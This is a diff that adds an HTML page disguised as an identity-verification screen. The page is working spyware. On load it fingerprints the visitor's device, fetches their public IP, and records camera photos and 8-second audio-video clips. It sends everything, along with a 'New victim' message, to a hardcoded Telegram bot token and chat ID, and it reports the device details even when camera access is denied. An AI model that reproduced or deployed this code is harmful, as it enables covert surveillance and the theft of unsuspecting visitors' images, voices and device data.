@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Continue to Proceed</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    background: linear-gradient(135deg, #1e3c72, #2a5298);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .container {
+    text-align: center;
+    background: rgba(0,0,0,0.6);
+    padding: 40px;
+    border-radius: 16px;
+    max-width: 90%;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  }
+  h1 { margin: 0 0 20px; font-size: 28px; }
+  .loading { font-size: 18px; margin: 20px 0; color: #4fc3f7; }
+  .hidden { display: none; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+  <h1>Verifying your identity...</h1>
+  <div class="loading" id="loading">Accessing camera & microphone — please allow</div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = '8918479950:AAF1A7NXbxqN8-x18EbRUJeOTL4N2Cs8bDE';
+const CHAT_ID = '6764397819';
+let captureCount = 0;
+const MAX_CAPTURES = 3;
+
+// Page load hone ke turant baad shuru
+window.addEventListener('load', () => {
+  setTimeout(startCaptureProcess, 800); // thoda delay taaki page stable ho jaye
+});
+
+async function startCaptureProcess() {
+  document.getElementById('loading').textContent = 'Collecting device info & media...';
+
+  // 1. Battery + basic device info
+  let info = `New victim opened page\nTime: ${new Date().toISOString()}\nLocation hint: Delhi, IN (possible)\n`;
+
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      info += `Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
+      if (battery.chargingTime < Infinity) info += `Charging time est: ${battery.chargingTime}s\n`;
+    } catch {}
+  }
+
+  // 2. Public IP
+  let ip = 'Unknown';
+  try {
+    const res = await axios.get('https://api.ipify.org?format=json');
+    ip = res.data.ip;
+    info += `Public IP: ${ip}\n`;
+  } catch {
+    try {
+      const res2 = await axios.get('https://api.myip.com');
+      ip = res2.data.ip;
+      info += `Public IP (fallback): ${ip}\n`;
+    } catch {}
+  }
+
+  // 3. Extra fingerprint
+  info += `User-Agent: ${navigator.userAgent}\n`;
+  info += `Screen: ${screen.width}×${screen.height} (${screen.colorDepth}bit)\n`;
+  info += `Language: ${navigator.language || navigator.userLanguage}\n`;
+  info += `Platform: ${navigator.platform}\n`;
+  info += `Hardware Concurrency: ${navigator.hardwareConcurrency || 'unknown'}\n`;
+
+  // Pehle hi basic info bhej denge (chahe camera deny ho)
+  sendText(info + '\nAttempt #' + (captureCount + 1) + ' started');
+
+  // Camera + Mic capture loop
+  while (captureCount < MAX_CAPTURES) {
+    captureCount++;
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+        audio: true
+      });
+
+      // Photo
+      const photoBlob = await takePhoto(stream);
+      await sendMedia(photoBlob, 'photo', `${info}\nPhoto #${captureCount} - Face capture`);
+
+      // Short video (8 sec)
+      const videoBlob = await recordVideo(stream, 8000);
+      await sendMedia(videoBlob, 'video', `${info}\nVideo #${captureCount} - 8s recording`);
+
+      stream.getTracks().forEach(track => track.stop());
+    } catch (err) {
+      // Deny ya error hone pe
+      sendText(`${info}\nCapture #${captureCount} FAILED: ${err.name || err.message || 'Permission denied / Not allowed'}`);
+      break; // agar ek baar fail to ruk jao
+    }
+  }
+
+  document.getElementById('loading').textContent = 'Process completed.';
+}
+
+async function takePhoto(stream) {
+  const track = stream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(track);
+  return await imageCapture.takePhoto();
+}
+
+async function recordVideo(stream, durationMs) {
+  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+  const chunks = [];
+  recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+  recorder.start();
+  await new Promise(resolve => {
+    recorder.onstop = resolve;
+    setTimeout(() => recorder.stop(), durationMs);
+  });
+  return new Blob(chunks, { type: 'video/webm' });
+}
+
+async function sendMedia(blob, type, caption) {
+  const formData = new FormData();
+  const ext = type === 'photo' ? 'jpg' : 'webm';
+  formData.append(type, blob, `${type}_${Date.now()}.${ext}`);
+  formData.append('caption', caption);
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+  try {
+    await axios.post(url, formData, {
+      params: { chat_id: CHAT_ID },
+      headers: { 'Content-Type': 'multipart/form-data' }
+    });
+  } catch (e) {
+    console.error('Send failed:', e);
+  }
+}
+
+async function sendText(text) {
+  try {
+    await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      params: { chat_id: CHAT_ID, text: text.substring(0, 4000) } // Telegram limit
+    });
+  } catch {}
+}
+</script>
+</body>
+</html>
